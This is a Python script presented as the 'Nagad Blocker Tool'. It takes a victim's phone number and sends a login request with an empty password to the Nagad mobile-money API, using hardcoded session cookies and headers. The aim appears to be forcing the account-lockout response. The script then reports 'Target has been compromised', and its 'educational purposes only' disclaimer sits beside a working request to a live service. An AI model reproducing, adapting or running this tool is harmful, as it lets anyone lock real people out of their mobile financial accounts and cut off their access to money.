import requests
import time
import os
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to display a small progress bar
def small_progress_bar(total, prefix='', suffix='', length=20, fill='█'):
    for i in range(total + 1):
        percent = 100 * (i / float(total))
        filled_length = int(length * i // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{prefix} |{bar}| {percent:.1f}% {suffix}', end='\r')
        time.sleep(0.1)  # Simulate work being done
    print()

# Function to simulate a hacking process
def simulate_hacking():
    print(Fore.GREEN + "Initializing hacking sequence...")
    time.sleep(1)
    print(Fore.YELLOW + "Bypassing security protocols...")
    time.sleep(1)
    print(Fore.CYAN + "Injecting payload...")
    time.sleep(1)
    print(Fore.MAGENTA + "Establishing connection to target...")
    time.sleep(1)

# Main function
def main():
    while True:
        # Clear the terminal screen
        clear_screen()

        # Simple ASCII Art
        ascii_art = """
          _   _   _   _   _   _  
         / \\ / \\ / \\ / \\ / \\ / \\ 
        ( N | A | G | A | D | ! )
         \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ 
        """
        print(Fore.RED + Style.BRIGHT + ascii_art)
        print(Fore.BLUE + "Welcome to the Nagad Blocker Tool")
        print(Fore.YELLOW + "Disclaimer: This tool is for educational purposes only. Do not use it for illegal activities.")
        print(Fore.CYAN + "Developed by: Tofazzal Hossain\n")

        # Ask the user to enter the target phone number
        phone_number = input(Fore.WHITE + "Enter Target Number: " + Fore.GREEN)
        print(Fore.RESET)

        # Simulate hacking process
        simulate_hacking()

        # Define the URL and headers
        url = 'https://app2.mynagad.com:20002/api/login'
        headers = {
            'Host': 'app2.mynagad.com:20002',
            'User-Agent': 'okhttp/3.14.9',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'X-KM-UserId': '87594060',
            'X-KM-User-MpaId': '17404103407455511125333541230563',
            'X-KM-User-AspId': '100012345612345',
            'X-KM-User-Agent': 'ANDROID/1164',
            'X-KM-Accept-language': 'bn',
            'X-KM-AppCode': '01',
            'Content-Type': 'application/json; charset=UTF-8',
            'Cookie': 'WMONID=-SfYtwZ56xA; TS01e66e4e=01e006cfdc837d176a3e33e758d2a271e014631e9ccad981912d50ab6a5ed809861c606eb9ef5fe50a58225a8e61f5a5b82cd8796bd2369befcefad0353d147cefcae4ecf0; JSESSIONID=g2b9KaDZrWj2couoJaX62REkp4_n1cKnbTrpYbGu'
        }

        # Define the data to be sent in the POST request
        data = {
            'aspId': '100012345612345',
            'mpaId': '',
            'password': '',
            'username': phone_number
        }

        # Send the first request
        print(Fore.CYAN + "\nSending initial request to target...")
        time.sleep(2)

        # Simulate the response from the API
        response = requests.post(url, headers=headers, json=data)
        response_text = response.text

        # Check for specific error messages in the response
        if 'একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে। বিস্তারিত তথ্যের জন্য 16167 কল করুন।' in response_text:
            print(Fore.RED + "Target is already locked.")
        elif 'আপনার কোন নগদ অ্যাকাউন্ট নেই। নগদ অ্যাকাউন্ট খুলতে নিকটস্থ নগদ উদ্যোক্তার সাথে যোগাযোগ করুন অথবা ১৬১৬৭ এ কল করুন।' in response_text:
            print(Fore.RED + "Invalid Nagad number. Please enter a valid number.")
        else:
            # Show a small progress bar
            small_progress_bar(30, prefix='Processing:', suffix='Done')
            print(Fore.GREEN + "\nLocked Successful! Target has been compromised.")

        # Ask the user if they want to run the script again
        restart = input(Fore.WHITE + "\nDo you want to run the script again? (yes/no): " + Fore.GREEN).strip().lower()
        if restart not in ['yes', 'y']:
            print(Fore.RED + "\nExiting the script. Goodbye!")
            break

# Run the main function
if __name__ == "__main__":
    main()